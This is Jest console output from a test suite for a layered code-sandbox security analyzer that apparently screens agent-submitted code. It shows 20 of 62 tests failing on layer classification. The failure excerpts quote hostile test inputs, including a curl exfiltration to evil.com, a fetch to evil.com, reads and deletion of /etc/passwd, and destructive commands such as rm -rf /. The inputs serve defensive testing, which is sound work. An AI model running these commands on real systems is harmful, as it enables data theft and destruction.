node : (node:24052) ExperimentalWarning: VM Modules is an experimental feature 
and might change at any time
At line:1 char:1
+ node --experimental-vm-modules node_modules/jest/bin/jest.js tests/sa ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: ((node:24052) Ex...nge at any time 
   :String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
 
(Use `node --trace-warnings ...` to show where the warning was created)
FAIL tests/sandbox_security.test.js (7.067 s)
  Layer 1: Dangerous Commands
    ΓêÜ should block rm -rf / (10 ms)
    ΓêÜ should block rm -rf ~ (2 ms)
    ΓêÜ should block shutdown command (3 ms)
    ΓêÜ should block format command (2 ms)
    ΓêÜ should block dd command (2 ms)
    ΓêÜ should block kill -9 1 (init) (2 ms)
  Layer 2: Dangerous Imports
    ├ù should block require("child_process") (5 ms)
    ΓêÜ should block require("fs") (3 ms)
    ΓêÜ should block require("net") (3 ms)
    ΓêÜ should block Python import os (3 ms)
    ├ù should block Python import subprocess (2 ms)
    ΓêÜ should block Python __import__("os") (1 ms)
    ΓêÜ should block Java Runtime import (1 ms)
    ├ù should block C unistd.h (4 ms)
    ├ù should block C socket.h (3 ms)
    ΓêÜ should block Rust std::process::Command (2 ms)
  Layer 3: Code Injection Patterns
    ├ù should block eval() (7 ms)
    ├ù should block new Function() (1 ms)
    ├ù should block process.exit (2 ms)
    ├ù should block process.env access (2 ms)
    ├ù should block while(true) infinite loop (2 ms)
    ├ù should block for(;;) infinite loop (2 ms)
    ├ù should block fs.readFile (2 ms)
    ΓêÜ should block fs.writeFile (2 ms)
    ├ù should block fetch() (1 ms)
    ├ù should block Python __subclasses__ (2 ms)
    ├ù should block C system() call (2 ms)
    ├ù should block C fork() (1 ms)
    ├ù should block Go exec.Command (1 ms)
    ├ù should block Go os.Remove (1 ms)
    ├ù should block Java Runtime.exec (3 ms)
    ├ù should block __proto__ pollution (3 ms)
  Layer 4: Data Exfiltration
    ├ù should block curl exfiltration (3 ms)
    ΓêÜ should block wget exfiltration (2 ms)
    ΓêÜ should block nc (netcat) exfiltration (2 ms)
  Safe Code ΓÇö Should Pass All Layers
    ΓêÜ should allow simple Python print (2 ms)
    ΓêÜ should allow Python math operations (2 ms)
    ΓêÜ should allow Python list comprehension (2 ms)
    ΓêÜ should allow simple JavaScript console.log (2 ms)
    ΓêÜ should allow JavaScript math (2 ms)
    ΓêÜ should allow simple C printf (11 ms)
    ΓêÜ should allow simple C++ cout (1 ms)
    ΓêÜ should allow simple Java HelloWorld (2 ms)
    ΓêÜ should allow Go simple print (1 ms)
    ΓêÜ should allow Rust simple print (1 ms)
  Policy Engine
    ΓêÜ should assign correct trust levels (3 ms)
    ΓêÜ should enforce rate limits (2 ms)
    ΓêÜ should block oversized code (2 ms)
    ΓêÜ should cap timeout based on trust level (2 ms)
    ΓêÜ should allow trusted agent with reasonable timeout (3 ms)
    ΓêÜ should restrict untrusted agents to python/javascript only (2 ms)
    ΓêÜ should compute consistent code hash (1 ms)
  Trust Configuration
    ΓêÜ UNTRUSTED should have strictest limits (2 ms)
    ΓêÜ PRIVILEGED should have highest limits (1 ms)
  Supported Languages
    ΓêÜ should support all expected languages (2 ms)
  Integration: In-Process Sandbox Execution
    ΓêÜ should execute simple Python code (174 ms)
    ΓêÜ should execute simple JavaScript code (136 ms)
    ΓêÜ should block dangerous code execution (3 ms)
    ΓêÜ should handle timeout (5038 ms)
    ΓêÜ should handle compile errors gracefully (186 ms)
    ΓêÜ should auto-detect Python language (118 ms)
    ΓêÜ should auto-detect JavaScript language (145 ms)

  ΓùÅ Layer 2: Dangerous Imports ΓÇ║ should block require("child_process")

    expect(received).toBe(expected) // Object.is equality

    Expected: 2
    Received: 1

    [0m [90m 75 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'const cp = 
require("child_process");'[39m)[33m;[39m
     [90m 76 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 77 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m2[39m)[33m;[39m
     [90m    |[39m                          [31m[1m^[22m[39m
     [90m 78 |[39m   })[33m;[39m
     [90m 79 |[39m
     [90m 80 |[39m   test([32m'should block require("fs")'[39m[33m,[39m 
() [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:77:26)

  ΓùÅ Layer 2: Dangerous Imports ΓÇ║ should block Python import subprocess

    expect(received).toBe(expected) // Object.is equality

    Expected: 2
    Received: 1

    [0m [90m  99 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'import subprocess'[39m)[33m;[39m
     [90m 100 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 101 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m2[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 102 |[39m   })[33m;[39m
     [90m 103 |[39m
     [90m 104 |[39m   test([32m'should block Python 
__import__("os")'[39m[33m,[39m () [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:101:26)

  ΓùÅ Layer 2: Dangerous Imports ΓÇ║ should block C unistd.h

    expect(received).toBe(expected) // Object.is equality

    Expected: false
    Received: true

    [0m [90m 116 |[39m   test([32m'should block C 
unistd.h'[39m[33m,[39m () [33m=>[39m {
     [90m 117 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'#include <unistd.h>'[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 118 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
     [90m     |[39m                         [31m[1m^[22m[39m
     [90m 119 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m2[39m)[33m;[39m
     [90m 120 |[39m   })[33m;[39m
     [90m 121 |[39m[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:118:25)

  ΓùÅ Layer 2: Dangerous Imports ΓÇ║ should block C socket.h

    expect(received).toBe(expected) // Object.is equality

    Expected: false
    Received: true

    [0m [90m 122 |[39m   test([32m'should block C 
socket.h'[39m[33m,[39m () [33m=>[39m {
     [90m 123 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'#include <sys/socket.h>'[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 124 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
     [90m     |[39m                         [31m[1m^[22m[39m
     [90m 125 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m2[39m)[33m;[39m
     [90m 126 |[39m   })[33m;[39m
     [90m 127 |[39m[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:124:25)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block eval()

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 141 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'eval("console.log(1)")'[39m)[33m;[39m
     [90m 142 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 143 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 144 |[39m   })[33m;[39m
     [90m 145 |[39m
     [90m 146 |[39m   test([32m'should block new 
Function()'[39m[33m,[39m () [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:143:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block new Function()

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 147 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'new Function("return 1")'[39m)[33m;[39m
     [90m 148 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 149 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 150 |[39m   })[33m;[39m
     [90m 151 |[39m
     [90m 152 |[39m   test([32m'should block process.exit'[39m[33m,[39m 
() [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:149:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block process.exit

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 153 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'process.exit(1);'[39m)[33m;[39m
     [90m 154 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 155 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 156 |[39m   })[33m;[39m
     [90m 157 |[39m
     [90m 158 |[39m   test([32m'should block process.env 
access'[39m[33m,[39m () [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:155:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block process.env access

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 159 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'console.log(process.env);'[39m)[33m;[39m
     [90m 160 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 161 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 162 |[39m   })[33m;[39m
     [90m 163 |[39m
     [90m 164 |[39m   test([32m'should block while(true) infinite 
loop'[39m[33m,[39m () [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:161:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block while(true) infinite 
loop

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 165 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'while(true){}'[39m)[33m;[39m
     [90m 166 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 167 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 168 |[39m   })[33m;[39m
     [90m 169 |[39m
     [90m 170 |[39m   test([32m'should block for(;;) infinite 
loop'[39m[33m,[39m () [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:167:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block for(;;) infinite loop

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 171 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'for(;;){}'[39m)[33m;[39m
     [90m 172 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 173 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 174 |[39m   })[33m;[39m
     [90m 175 |[39m
     [90m 176 |[39m   test([32m'should block fs.readFile'[39m[33m,[39m 
() [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:173:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block fs.readFile

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 177 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'fs.readFile("/etc/passwd")'[39m)[33m;[39m
     [90m 178 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 179 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 180 |[39m   })[33m;[39m
     [90m 181 |[39m
     [90m 182 |[39m   test([32m'should block fs.writeFile'[39m[33m,[39m 
() [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:179:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block fetch()

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 191 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'fetch("http://evil.com")'[39m)[33m;[39m
     [90m 192 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 193 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 194 |[39m   })[33m;[39m
     [90m 195 |[39m
     [90m 196 |[39m   test([32m'should block Python 
__subclasses__'[39m[33m,[39m () [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:193:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block Python __subclasses__

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 197 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'().__class__.__subclasses__()'[39m)[33m;[39m
     [90m 198 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 199 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 200 |[39m   })[33m;[39m
     [90m 201 |[39m
     [90m 202 |[39m   test([32m'should block C system() 
call'[39m[33m,[39m () [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:199:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block C system() call

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 203 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'system("ls -la");'[39m)[33m;[39m
     [90m 204 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 205 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 206 |[39m   })[33m;[39m
     [90m 207 |[39m
     [90m 208 |[39m   test([32m'should block C fork()'[39m[33m,[39m () 
[33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:205:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block C fork()

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 209 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'fork();'[39m)[33m;[39m
     [90m 210 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 211 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 212 |[39m   })[33m;[39m
     [90m 213 |[39m
     [90m 214 |[39m   test([32m'should block Go 
exec.Command'[39m[33m,[39m () [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:211:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block Go exec.Command

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 2

    [0m [90m 215 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'exec.Command("ls")'[39m)[33m;[39m
     [90m 216 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 217 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 218 |[39m   })[33m;[39m
     [90m 219 |[39m
     [90m 220 |[39m   test([32m'should block Go os.Remove'[39m[33m,[39m 
() [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:217:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block Go os.Remove

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 221 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'os.Remove("/etc/passwd")'[39m)[33m;[39m
     [90m 222 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 223 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 224 |[39m   })[33m;[39m
     [90m 225 |[39m
     [90m 226 |[39m   test([32m'should block Java 
Runtime.exec'[39m[33m,[39m () [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:223:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block Java Runtime.exec

    expect(received).toBeGreaterThanOrEqual(expected)

    Expected: >= 2
    Received:    1

    [0m [90m 228 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
     [90m 229 |[39m     [90m// Matches layer 2 (import) or layer 3 (code 
injection) depending on pattern order[39m
    [31m[1m>[22m[39m[90m 230 |[39m     expect(result[33m.[39mlayer)[33
m.[39mtoBeGreaterThanOrEqual([35m2[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 231 |[39m     expect(result[33m.[39mlayer)[33m.[39mtoBeLessThan
OrEqual([35m3[39m)[33m;[39m
     [90m 232 |[39m   })[33m;[39m
     [90m 233 |[39m[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:230:26)

  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block __proto__ pollution

    expect(received).toBe(expected) // Object.is equality

    Expected: 3
    Received: 1

    [0m [90m 235 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'obj.__proto__ = malicious;'[39m)[33m;[39m
     [90m 236 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 237 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m3[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 238 |[39m   })[33m;[39m
     [90m 239 |[39m })[33m;[39m
     [90m 240 |[39m[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:237:26)

  ΓùÅ Layer 4: Data Exfiltration ΓÇ║ should block curl exfiltration

    expect(received).toBe(expected) // Object.is equality

    Expected: 4
    Received: 1

    [0m [90m 247 |[39m     [36mconst[39m result [33m=[39m 
analyzeCodeSecurity([32m'curl 
http://evil.com/steal?data=secret'[39m)[33m;[39m
     [90m 248 |[39m     
expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
    [31m[1m>[22m[39m[90m 249 |[39m     
expect(result[33m.[39mlayer)[33m.[39mtoBe([35m4[39m)[33m;[39m
     [90m     |[39m                          [31m[1m^[22m[39m
     [90m 250 |[39m   })[33m;[39m
     [90m 251 |[39m
     [90m 252 |[39m   test([32m'should block wget 
exfiltration'[39m[33m,[39m () [33m=>[39m {[0m

      at Object.<anonymous> (tests/sandbox_security.test.js:249:26)

Test Suites: 1 failed, 1 total
Tests:       20 failed, 42 passed, 62 total
Snapshots:   0 total
Time:        7.338 s, estimated 9 s
Ran all test suites matching /tests\\sandbox_security.test.js/i.
